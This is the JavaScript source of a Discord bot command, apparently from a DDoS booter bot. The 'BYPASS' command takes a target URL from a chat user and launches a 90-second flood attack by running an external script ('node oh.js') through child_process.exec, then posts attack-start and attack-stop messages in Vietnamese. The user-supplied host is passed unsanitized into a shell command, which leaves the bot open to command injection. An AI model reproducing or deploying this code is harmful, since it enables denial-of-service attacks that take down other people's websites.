const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('👿 LƯU Ý 👿')
	.setDescription("`Mẫu .BYPASS https://example.com/`")
	.setFooter("Cấm ddos .edu .gov web chinh phu !")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`node oh.js ${host} 90`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('`          🧛𝑳𝑼𝑿 𝑩𝑶𝑻🧛`')
	.setTimestamp()
	.setDescription("**🤖 STOP METHODS BYPASS 👻**")
	.setFooter('© Developer: Phuc#2005', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 200000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/jzHFPlw89eTqU/giphy.gif","https://media.giphy.com/media/L4g1Bfsz6ETMERi4gR/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('`          🧛𝑳𝑼𝑿 𝑩𝑶𝑻🧛`')
	.setTimestamp()
  .setDescription("** USER NAME**: `" + message.author.username + "` \n **URL ATTACK**: `" + host + "` \n **METHOD**: `Bypass V1` \n **TIME**: `90 𝐒𝐞𝐜𝐜𝐨𝐧𝐝 `")	
  .setFooter('© Developer: Phuc#2005', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['BYPASS'],
  permLevel: 0
}

exports.help = {
  name: 'BYPASS',
  description: 'Phuc',
  usage: 'BYPASS'
}